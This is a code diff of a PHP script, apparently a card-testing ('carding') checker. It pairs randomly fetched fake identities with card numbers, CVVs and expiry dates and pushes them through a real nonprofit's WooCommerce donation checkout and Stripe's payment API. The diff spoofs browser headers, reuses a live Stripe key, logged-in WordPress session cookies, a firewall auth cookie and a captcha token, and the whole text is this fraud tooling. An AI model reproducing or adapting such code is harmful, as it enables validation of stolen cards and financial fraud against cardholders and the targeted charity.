@@ -1967,6 +1967,31 @@ $id_text = file_get_contents("ID");
 $startTime = microtime(true); //TIEMPO DE INICIO
 $BinData = BinData($bin); //Extrae los datos del bin
 	
+//RANDOM USER//
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$get = curl_exec($ch);
+curl_close($ch);
+        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
+        $name = $matches1[1][0];
+        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
+        $last = $matches1[1][0];
+        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
+        $email = $matches1[1][0];
+        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
+        $street = $matches1[1][0];
+        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
+        $city = $matches1[1][0];
+        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
+        $state = $matches1[1][0];
+        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
+        $phone = $matches1[1][0];
+        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
+        $postcode = $matches1[1][0];
+
+
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://facesandvoicesofrecovery.org/engage/donate/',
@@ -1992,10 +2017,9 @@ $patron = '/name="woocommerce-process-checkout-nonce" value="([a-zA-Z0-9]+)"/';
 preg_match($patron, $response, $coincidencias);
 $nonce = $coincidencias[1];
 curl_close($curl);
-$nonce = "0c226d85e5";
-sendPv($myid, $nonce);
+echo "$nonce\n";
 
-/////////PAYEMNT ID//////
+
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
@@ -2005,11 +2029,13 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'billing_details%5Bname%5D=Carlos+Perez&billing_details%5Bemail%5D=Dausitherer%40cuvox.de&billing_details%5Bphone%5D=4179204022&billing_details%5Baddress%5D%5Bcity%5D=New+york&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Baddress%5D%5Bline1%5D=6195+bollinger+rd&billing_details%5Baddress%5D%5Bline2%5D=&billing_details%5Baddress%5D%5Bpostal_code%5D=10010&billing_details%5Baddress%5D%5Bstate%5D=AZ&type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2Fb2d52e5892%3B+stripe-js-v3%2Fb2d52e5892%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ffacesandvoicesofrecovery.org&time_on_page=3691342&client_attribution_metadata%5Bclient_session_id%5D=8c38e141-9d00-42bb-ad09-496cab1e947b&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=9b390fb9-9d44-4936-879c-c42e2238aac8f689f9&muid=013db8e1-2d46-4cd8-b889-9ef257b130fabf70b4&sid=70539d18-0b58-440d-9eef-adecd518b69a6ba046&key=pk_live_51EkCnzKp81anl5QIKzwBcjWRkc7CcluE8E7Y8ruaRVcOd5ATfw8Ian4jgMhds0gVbhGo6fRie8IQbm4znjUeblBA00HrWAWM5Y&_stripe_version=2024-06-20',
+  CURLOPT_POSTFIELDS => 'billing_details%5Bname%5D='.$name.'+'.$last.'&billing_details%5Bemail%5D='.$email.'&billing_details%5Bphone%5D='.$phone.'&billing_details%5Baddress%5D%5Bcity%5D='.$city.'&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Baddress%5D%5Bline1%5D='.$street.'&billing_details%5Baddress%5D%5Bline2%5D=&billing_details%5Baddress%5D%5Bpostal_code%5D='.$postcode.'&billing_details%5Baddress%5D%5Bstate%5D='.$state.'&type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F04e5aa74c1%3B+stripe-js-v3%2F04e5aa74c1%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ffacesandvoicesofrecovery.org&time_on_page=37795&client_attribution_metadata%5Bclient_session_id%5D=7f391aa9-babf-49ee-a397-86e12a599308&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=a236ec11-4754-46eb-9c61-23ad7766e882872b7b&muid=e8398605-f154-4877-b187-a7cee3a338b74c2226&sid=8fbaf3a4-34e1-4d60-8833-357ce1408ef8e06a35&key=pk_live_51EkCnzKp81anl5QIKzwBcjWRkc7CcluE8E7Y8ruaRVcOd5ATfw8Ian4jgMhds0gVbhGo6fRie8IQbm4znjUeblBA00HrWAWM5Y&_stripe_version=2024-06-20&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoicWppT25DcXZGYVBOMmJHMUhIWjBVdXFoM1lGRERXU1Z2NE9nNVQzTlpzVkJzSFdWeTJKeEdzS2dya0szb2ZhSTZwWEdCM2JEZUxySDNxTG5sMXlmWWZQNUhvTUlINy9BOHVBa3lhd05LV1lSU1VyZ2ZtRWJoZHdaZXVtYmJveUlPSGFZcjJJYmlRTDFSNXM4YStWdGEzWStHYUEydWFSeW1VY2ZEYk9aWEdRVkVUcGhrS0VlSERnK3BGVVJyZ3NzMG1nL0NCNkZhYlZkSmFLSEpCaWhBMVVGYXNVYVliRS8yaFEwNi9Kd1NDRjM4YlM4WDVQNmZrUjFhT1JKVUUvK0ljOEM0M0NSZWI0dEtQdmNaZjZmdCtzMzhZdEdZc3RHRThTWjdWdFRMVzMwRkhFcCtnOU5PRGhGa3lZYmpPTGZobDFFUkRrWlhOc0JJTVhjQURJU1ZhbzFLSW10TS8xWXBIeXQ1SzRxd2ZOSTE4eEJ5WVdmKzZqWWc2eE9Kc1VCcUVWam5YclZlMUFJT0FsaU1iOUtrTzdONDV2N3l0a3ZWbEpUVldXVkhhNjE1akUwYUw0cEhKdTZRcDlnN3VIQzhoL0hrUnRJQno1UEhZT21GYWNUYzJGUit6MllmZXAyL21VVEdwNGo4SjVQU0dBM0dSekhmeUlSMEk2VTFiL1lwSGIwMG9UckkvL1g4TjZ1T09MSUVxU0kwckN5eTE0V0FSSkhoTHBnaERXNWRUKzB5SXAzblNoWnUreVZ1SFlybFlRY1djeXY1TFhLQXNhc0h6aW1TTUdJeERTWEx1U1crRjVPcDBHRmcvZjRiclYySjdJQTRQb3NzbVN2dE5odUNCbVJma2hBRkxUbzZXNHZ0YTlrSERoNUNEVlRQYU9lQWxMMm5NQ0kxRUZadHNDUFZvUzZmcGpSSXNqZ2U0QmFablZtbTB4UmlkY2wwazlDdXBZZWZKczc3VXc1dktLdFdkakR5YmNIaGRmUUhvN1FvS2tYdkl3YXN5ckFkZ2lZYnhyWUNzd2wrR09sWVljd2RvVU8xMVpEZDVYazZQNFRMeTEwV3pkeXRmTWl2ZkZBQnFaZlFvQTNLYjlWaXNYMFVZMnoxTFhkS0s4a2IzVUhJTmVoR3FwdnllZDBzVVlvdmE2VlFBZnZZSDZUbVZoS0NYdDhGN0xmQXEvK3h2eWlXV3IraXB0elFERnpsM1gwWm5JemMyejhXZFpZQWVucnBXYXNuMzhpQnJPZlFkZVcrd3ZxNkdEczRpM1p5QTc1VHNTSjJzMGQvY04yRi9Oci8rMm5MNUlkelNmcWNMeGEvT2ZBeGlEVDUvODdjdFF4b0d3bVhoemNxaGR4TG5jdXpZcGtPN1NnWWF4SzZ1aFFYbklDckg5MWhnRWp2bTRRTXZEZnRweW9hbDRESURSSmlhNUt0cnQ3bXdUMWdDdFllWFE2cjRQYkxpMm5ZTEF4ZUtPSzI2NzhsbjB0YVB4UEFDSDlDOXJ6aHh0ZkN6VXZ3cHBObTAyWmFKREFDZHJud01tQ0xkSER3bExGdUxQQkJKN2N6S2huK09PM3hUcmlBcXY3SzVrcjVPWnJHN0RxWDdFZy80MXFnc2MzeEd4QzAyR3NDL1NqMTBudWl4ZXd3TGpuQ3d3U2FnK2FvbEc0SHQxVVVsQ29pbXluNU5nQUFlVmZnaUFjc3RaZjBJYTdFb3JVeVJtZk5mbURjUTBlTG5UckRlaWZDSy91Ty94d0xkN0szM2NkbTMzRS9iMW9SMmFqazM3VUNtUFR0SC9kVjhpV21mSGtJbUg1bmNoOXNYQjl0cGhRQ2ZiQmZXaE01ZGZ2ODNIb2NtSHU2ckVtQ2puU1kyVTdITFZYQUw5TWh1R3NVSVdjcUlaeVJoYWtZZGJwcG1NV3cvY1pVODNkY1V6T2dmK2ttQ3dyckFTK1FQMUVzRHVNTWdFNy81WVdDSjFsM0RvMTBGc3grdk9OcmYyMFRjTlhMTXdqQVpDWm1jOEZXQWR2T3dEcFlCeFlGNW8yRFRQa0doa1lPWmVFdHp5dHV4ZU84a2UvRHQzbFBPZTR2WUNBRkJ5ekxBakVSVVoyRGlod1hDQlUrQ0lJWkVpb1RCOFZ6WUJwSFF5UzNtU09QVUVndnoyc3Ezb1NqWVB1QS9GbzBjRGYxNEpLbWh1UWZHaHRkS0xaazlNYU9WUWpMcFIvZU4rOFVKRDlvaW8zc2psVkdWNXdnbDZ3WUdrb2s0bXNjblRMY0EyQXBIMkdTOWFBbkZvM3I4VUpSRU01eXNlcUlkVVkzUEZNVEs4cmhIdWkwTVdDTU9MbUpZMm9tYnMwTEthMXhOVHNOQkhsajB6RFZ4KytUREYrQTBXWTh6UTY0VHdRUWdJZEtuK2hOVk1kVGF4bDJCbTRlOUdSN2h1eDRpVmVpanRYOEhSenpISElWemJGVG5FSk1qYWMyY282My9PeU44TmRKNXpvL2pTQ3F4NTdudkNZQk1kTXpPVzVTLzh5eEY4MWJnNkVOZmJxUm9FWWcrQWcvR0czQlZNZk92L1UxUUVSS0VnbmJLeFkrc25VZDhYRTErcXd0aU1qUFBkZGVZVWc5dWVtaG9qYkxUSFBHOGVaeHRXdzg4WkFQMGZINTUvVE8waGwweHBuOXNJeEZ6bjhjRDdDZUo2Vk42bFhIZWExZXJnMnJBMVY1d1p2TGFaSmNGeTlEdWhBTnZlNFBMVjlFdTFhNzlFRzNCenZtVGhFc09IcjVFSVVGczc0bUs2MEJmMGZsaFVnSThNQ3ZWMTZsK2pXQis3YU5rdkQ5YmM9IiwiZXhwIjoxNzMxNTUxNzAwLCJzaGFyZF9pZCI6MjIxOTk2MDczLCJrciI6IjMzMzVjMSIsInBkIjowLCJjZGF0YSI6IkdLVTB4N21vdFd5YnhYK3dTMUtXZkxIWXU3TlJBNUllVGJUaUt1eW53MUtPMkc4ZDB4Vk1ZS1lWbi81bTZNemNwaTVDMVV6c2ZsMytQbmF5dGR5VXkxbkVsdXJVcHMwYkhJbnMxZ0tVRzhscER5ZCthT204cFdxVjdWRVBNRCt6YldSRkxkQjFVYXpiVWEvMnJhcndvM2lYamRnbThhNThkc0V0RWFPNTk5U3pQZDZEaXRzTlZkM25kcXBidTJ1ZVJlczY1SVhXK1cxUXovZjcifQ.oRAkXNy3jstOMy0hGz7Bm9lXwT7H9KOSp-u7V_pfy5A',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
     'Accept: application/json',
     'Content-Type: application/x-www-form-urlencoded',
+    'sec-ch-ua-platform: "Android"',
+    'accept-language: es-US,es;q=0.9',
     'origin: https://js.stripe.com',
     'referer: https://js.stripe.com/',
   ],
@@ -2020,9 +2046,12 @@ $err = curl_error($curl);
 $json = json_decode($response, true);
 $id = $json["id"];
 curl_close($curl);
-sendPv($myid, $id);
-///////PAYMENT CHECKOUT///////
+
+echo "$id\n";
+
+
 $curl = curl_init();
+
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://facesandvoicesofrecovery.org?wc-ajax=checkout',
   CURLOPT_RETURNTRANSFER => true,
@@ -2031,14 +2060,16 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'billing_email=Dausitherer%40cuvox.de&billing_first_name=Carlos&billing_last_name=Perez&billing_company=&billing_country=US&billing_address_1=6195+bollinger+rd&billing_address_2=&billing_city=New+york&billing_state=AZ&billing_postcode=10010&billing_phone=4179204022&fvr_wc_donation_in_honor_of=&order_comments=&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&wc-stripe-new-payment-method=true&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc-stripe-payment-method='.$id.'',
-  CURLOPT_COOKIE => '__stripe_mid=013db8e1-2d46-4cd8-b889-9ef257b130fabf70b4; wordpress_logged_in_508923f30af7c37ea20c1d6887bb80bd=carlos.perez%7C1731729744%7Cp7KAvNle7Z1J9WwkLyQ4PTMeq1zNEmuc8436DoPO1Gc%7C358a3a02a21c66e436aeb6c84464c7c513b7cb769cf0952f36dd1cb596190913; wfwaf-authcookie-084fa67f8cdb5120d8f1ead9606207d0=19092%7Cother%7Cread%7C9b80607f8b152af04d4de6a5860e80b173be2a76913bd7c83737f613d629b74a; woocommerce_items_in_cart=1; woocommerce_cart_hash=c73fc674d47101bf3c9ebdaef484e9dc; wp_woocommerce_session_508923f30af7c37ea20c1d6887bb80bd=19092%7C%7C1730915669%7C%7C1730912069%7C%7Caa2d791533bee39231e95271e622e89c; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-04%2017%3A53%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcheckout%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-04%2017%3A53%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcheckout%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=3c88e117-1e5f-4ee0-8ca2-b75cf6bce7262f0bfe; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcheckout%2F',
+  CURLOPT_POSTFIELDS => 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcheckout%2F&wc_order_attribution_session_start_time=2024-11-14+02%3A29%3A54&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F130.0.0.0+Mobile+Safari%2F537.36&billing_email='.$email.'&billing_first_name='.$name.'&billing_last_name='.$last.'&billing_company=&billing_country=US&billing_address_1='.$street.'&billing_address_2=&billing_city='.$city.'&billing_state='.$state.'&billing_postcode='.$postcode.'&billing_phone='.$phone.'&fvr_wc_donation_in_honor_of=&order_comments=&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&wc-stripe-new-payment-method=true&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc-stripe-payment-method='.$id.'',
+  CURLOPT_COOKIE => 'wordpress_logged_in_508923f30af7c37ea20c1d6887bb80bd=carlos.perez%7C1731729744%7Cp7KAvNle7Z1J9WwkLyQ4PTMeq1zNEmuc8436DoPO1Gc%7C358a3a02a21c66e436aeb6c84464c7c513b7cb769cf0952f36dd1cb596190913; wfwaf-authcookie-084fa67f8cdb5120d8f1ead9606207d0=19092%7Cother%7Cread%7Cd3fc84ddf757273bc068194acf1e986b13cb094ebcc3ce59dbd6f46031f024ea; woocommerce_items_in_cart=1; woocommerce_cart_hash=c73fc674d47101bf3c9ebdaef484e9dc; wp_woocommerce_session_508923f30af7c37ea20c1d6887bb80bd=19092%7C%7C1731724262%7C%7C1731720662%7C%7Ce40ce29008ab8337ffd6a94f35e07914; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-14%2002%3A29%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcheckout%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-14%2002%3A29%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcheckout%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=e8398605-f154-4877-b187-a7cee3a338b74c2226; __stripe_sid=8fbaf3a4-34e1-4d60-8833-357ce1408ef8e06a35; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fengage%2Fdonate%2F',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
     'x-requested-with: XMLHttpRequest',
     'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+    'accept-language: es-US,es;q=0.9',
     'origin: https://facesandvoicesofrecovery.org',
-    'referer: https://facesandvoicesofrecovery.org/checkout/',
+    'referer: https://facesandvoicesofrecovery.org/engage/donate/',
   ],
 ]);
 	
